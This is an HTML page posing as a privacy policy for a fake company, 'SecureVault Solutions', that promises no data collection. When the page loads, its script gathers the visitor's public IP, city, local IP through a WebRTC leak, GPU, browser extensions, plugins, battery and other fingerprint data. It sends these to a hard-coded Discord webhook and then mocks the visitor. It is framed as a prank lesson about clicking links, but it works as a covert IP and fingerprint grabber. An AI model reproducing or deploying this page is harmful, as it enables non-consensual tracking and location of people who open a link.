<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy Policy • SecureVault Solutions</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: system_ui, sans-serif; }
        .reveal-card { animation: fadeIn 1.5s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .warning-banner { background: linear-gradient(90deg, #dc2626, #b91c1c); }
        .sent-badge { animation: ping 2s infinite; }
        .big-surprise { font-size: 2.35rem; line-height: 1.05; }
    </style>
</head>
<body class="bg-zinc-950 text-zinc-200">
    <div class="max-w-4xl mx-auto min-h-screen flex flex-col">
        <!-- Header -->
        <header class="bg-zinc-900 border-b border-zinc-800">
            <div class="px-8 py-6 flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center text-2xl font-bold">🔒</div>
                    <div>
                        <h1 class="text-2xl font-bold tracking-tight">SecureVault Solutions</h1>
                        <p class="text-xs text-zinc-500">Enterprise Security • Since 2018</p>
                    </div>
                </div>
                <div class="text-sm font-medium text-emerald-400">Last updated: March 2026</div>
            </div>
        </header>

        <main class="flex-1 px-8 py-10">
            <!-- Fake Privacy Policy -->
            <div class="prose prose-invert max-w-none">
                <h1 class="text-4xl font-bold mb-2">Privacy Policy</h1>
                <p class="text-emerald-400 text-lg mb-8">We take your privacy extremely seriously. SecureVault Solutions does not collect, store, or share any personal data without your explicit consent.</p>
                
                <div class="bg-zinc-900 rounded-2xl p-8 mb-12 border border-zinc-800">
                    <h2 class="text-xl font-semibold mb-6 flex items-center gap-2">
                        <span class="text-emerald-400">1.</span> 
                        Information We Collect
                    </h2>
                    <ul class="space-y-4 text-zinc-400">
                        <li class="flex gap-3"><span class="text-emerald-500 font-mono">✓</span> Nothing. We respect your privacy.</li>
                        <li class="flex gap-3"><span class="text-emerald-500 font-mono">✓</span> No IP addresses are logged.</li>
                        <li class="flex gap-3"><span class="text-emerald-500 font-mono">✓</span> No browser fingerprints.</li>
                        <li class="flex gap-3"><span class="text-emerald-500 font-mono">✓</span> No location data ever.</li>
                        <li class="flex gap-3"><span class="text-emerald-500 font-mono">✓</span> No phone numbers (impossible anyway).</li>
                    </ul>
                </div>

                <p class="text-zinc-400 text-center italic mb-10">"Your data belongs to you. We don't even look."</p>
            </div>

            <!-- REVEAL SECTION -->
            <div class="reveal-card bg-zinc-900 border border-red-500/30 rounded-3xl p-10 shadow-2xl">
                <div class="flex items-center gap-3 mb-6">
                    <div class="px-4 py-1 bg-red-500 text-white text-xs font-bold rounded-full tracking-widest flex items-center gap-2">
                        <span class="sent-badge inline-block w-2 h-2 bg-green-400 rounded-full"></span>
                        SENT TO DISCORD
                    </div>
                    <div class="h-px flex-1 bg-gradient-to-r from-red-500/30 to-transparent"></div>
                </div>
                
                <h2 class="big-surprise font-bold text-red-400 mb-3">Never trust links buddy boy</h2>
                <p class="text-3xl text-red-300 mb-8 font-medium">we have EVERYTHING.</p>
                <p class="text-xl text-zinc-400 mb-8">Your friend just received <span class="font-bold text-red-400">ALL OF THIS + FULL BROWSER FINGERPRINT</span> in his Discord.</p>

                <div id="info-display" class="grid grid-cols-1 md:grid-cols-2 gap-6 text-sm">
                    <!-- Populated by JavaScript -->
                </div>

                <div class="mt-10 pt-8 border-t border-zinc-800 text-center">
                    <div onclick="copyAllInfo()" 
                         class="inline-flex items-center gap-2 bg-zinc-800 hover:bg-zinc-700 transition-colors px-6 py-3 rounded-2xl cursor-pointer text-emerald-400 text-sm font-medium">
                        📋 Copy everything to clipboard
                    </div>
                </div>
            </div>
        </main>

        <!-- Big Warning -->
        <div class="warning-banner text-white py-8 px-8 text-center">
            <div class="max-w-2xl mx-auto">
                <div class="text-2xl font-black tracking-tighter mb-3">LESSON LEARNED?</div>
                <p class="text-lg leading-tight">
                    This page was made by your friend to prove a point.<br>
                    <span class="font-bold">Clicking random links is dangerous.</span><br><br>
                    He now has your real IP, location, full device info, battery, local network IP, WebGL fingerprint, detected extensions, plugins, memory usage, and more — all in his Discord.<br><br>
                    <span class="text-2xl">🚫 STOP CLICKING SUSPICIOUS LINKS.</span>
                </p>
            </div>
        </div>

        <footer class="bg-zinc-900 py-8 text-center text-xs text-zinc-500 border-t border-zinc-800">
            Made as a friendly prank • Not a real company • Close this tab and remember the lesson 😉
        </footer>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1478908942363918428/bAhs677qjoRhDPZ81KVUM0SvzJ-qrZkhGRqlU5XtSj_AiIqxwKuZR08txhDL0bG0qHjV";

        function getLocalIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate.indexOf('srflx') > -1) {
                        const ip = e.candidate.candidate.split(' ')[4];
                        if (!ips.includes(ip)) ips.push(ip);
                    }
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                setTimeout(() => {
                    pc.close();
                    resolve(ips.length ? ips.join(', ') : 'None detected');
                }, 1500);
            });
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Not supported";
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                    const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                    return `${renderer} | Vendor: ${vendor}`;
                }
                return "Supported (details hidden)";
            } catch (e) {
                return "Blocked or not supported";
            }
        }

        function getDetectedExtensions() {
            const exts = [];
            if ("ethereum" in window) exts.push("MetaMask");
            if ("web3" in window) exts.push("Web3.js");
            if (navigator.brave && typeof navigator.brave.isBrave === "function") exts.push("Brave Browser");
            if (typeof InstallTrigger !== "undefined") exts.push("Firefox-specific");
            if (window.chrome && window.chrome.runtime && window.chrome.runtime.id) exts.push("Chrome Extension");
            if (typeof window.__uBlock !== "undefined" || document.querySelector('u-block')) exts.push("uBlock Origin (partial)");
            if (window.grammarly) exts.push("Grammarly");
            return exts.length ? exts.join(", ") : "None of the popular ones detected (most extensions stay hidden for privacy)";
        }

        async function fetchInfo() {
            const display = document.getElementById('info-display');
            let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', country_name: 'N/A' };
            
            try {
                const res = await fetch('https://ipapi.co/json/', { headers: { 'Accept': 'application/json' } });
                ipData = await res.json();
            } catch (e) {}

            let batteryInfo = 'N/A';
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '🔌 Charging' : '🔋 Discharging'}`;
                } catch (e) {}
            }

            const localIP = await getLocalIPs();
            const webgl = getWebGLInfo();
            const extensionsDetected = getDetectedExtensions();
            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(" | ") || "None";
            const jsMemory = performance.memory ? `${Math.round(performance.memory.usedJSHeapSize / 1024 / 1024)} MB` : "N/A";

            const info = [
                { label: "Public IP Address", value: ipData.ip || "N/A", mono: true },
                { label: "City", value: ipData.city || "N/A" },
                { label: "Region / State", value: ipData.region || "N/A" },
                { label: "Country", value: ipData.country_name || "N/A" },
                { label: "Local Network IP (WebRTC)", value: localIP, mono: true },
                { label: "Browser & OS", value: navigator.userAgent.substring(0, 90) + "...", mono: true },
                { label: "Platform", value: navigator.platform },
                { label: "Full Languages", value: navigator.languages.join(", ") },
                { label: "Screen Resolution", value: `${screen.width} × ${screen.height} (${screen.pixelDepth}bit)` },
                { label: "Viewport Size", value: `${window.innerWidth}×${window.innerHeight}px` },
                { label: "Available Screen", value: `${screen.availWidth}×${screen.availHeight}px` },
                { label: "Device Pixel Ratio", value: window.devicePixelRatio + "x" },
                { label: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
                { label: "CPU Cores", value: navigator.hardwareConcurrency || "N/A" },
                { label: "Device Memory (GB)", value: navigator.deviceMemory || "N/A" },
                { label: "JS Heap Memory", value: jsMemory },
                { label: "Battery Status", value: batteryInfo },
                { label: "Connection Type", value: navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "N/A" },
                { label: "Downlink Speed", value: navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A" },
                { label: "RTT (latency)", value: navigator.connection ? navigator.connection.rtt + " ms" : "N/A" },
                { label: "Do Not Track", value: navigator.doNotTrack === "1" ? "Enabled" : "Disabled / Not set" },
                { label: "Phone Number", value: "❌ IMPOSSIBLE — Browsers block this completely", mono: true },
                { label: "Mobile Device", value: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "Yes" : "No" },
                { label: "Device Vendor", value: navigator.vendor || "N/A" },
                { label: "Touch Points", value: navigator.maxTouchPoints ? navigator.maxTouchPoints + " points" : "None" },
                { label: "Cookies Enabled", value: navigator.cookieEnabled ? "Yes" : "No" },
                { label: "Online Status", value: navigator.onLine ? "Yes" : "No" },
                { label: "History Length", value: history.length + " pages" },
                { label: "Plugins Detected", value: plugins, mono: true },
                { label: "WebGL Graphics Card", value: webgl, mono: true },
                { label: "Detected Extensions", value: extensionsDetected, mono: true },
                { label: "Vibration API", value: !!navigator.vibrate ? "Supported" : "Not supported" },
                { label: "Java Enabled", value: typeof navigator.javaEnabled === "function" ? (navigator.javaEnabled() ? "Yes" : "No") : "N/A" },
                { label: "PDF Viewer Enabled", value: navigator.pdfViewerEnabled ? "Yes" : "No" },
                { label: "Referrer URL", value: document.referrer || "None (opened directly)" }
            ];

            let html = '';
            info.forEach(item => {
                html += `
                    <div class="bg-zinc-950 rounded-2xl p-5 border border-zinc-800">
                        <div class="text-zinc-500 text-xs mb-1">${item.label}</div>
                        <div class="${item.mono ? 'font-mono text-emerald-300 break-all' : 'font-medium'} text-lg">
                            ${item.value}
                        </div>
                    </div>
                `;
            });
            display.innerHTML = html;

            // === SEND TO DISCORD WEBHOOK ===
            const fields = info.slice(0, 25).map(item => ({
                name: item.label,
                value: item.value.length > 100 ? item.value.substring(0, 97) + "..." : item.value,
                inline: true
            }));

            const payload = {
                embeds: [{
                    title: "🎣 Prank Link Clicked — Lesson Delivered!",
                    description: "*Rip** — we have EVERYTHING.\n\nFull device + browser fingerprint + extensions + WebGL + plugins collected and sent instantly.\n\n**Reminder:** Never click random links again.",
                    color: 0xff0000,
                    timestamp: new Date().toISOString(),
                    fields: fields,
                    footer: { text: "Made as a friendly prank • Stop clicking shady links" }
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        function copyAllInfo() {
            const display = document.getElementById('info-display');
            let text = "=== YOUR INFO THAT WAS JUST SENT TO DISCORD ===\n\n";
            
            Array.from(display.children).forEach(child => {
                const label = child.querySelector('.text-zinc-500').textContent.trim();
                const value = child.querySelector('.text-lg').textContent.trim();
                text += `${label}: ${value}\n`;
            });
            
            text += "\n\nNever trust links buddy boy — we have EVERYTHING.\nLesson learned — don't click random links again! 🚫";
            
            navigator.clipboard.writeText(text).then(() => {
                const btn = event.currentTarget;
                const original = btn.innerHTML;
                btn.innerHTML = '✅ Copied!';
                setTimeout(() => btn.innerHTML = original, 2000);
            });
        }

        window.onload = fetchInfo;
    </script>
</body>
</html>
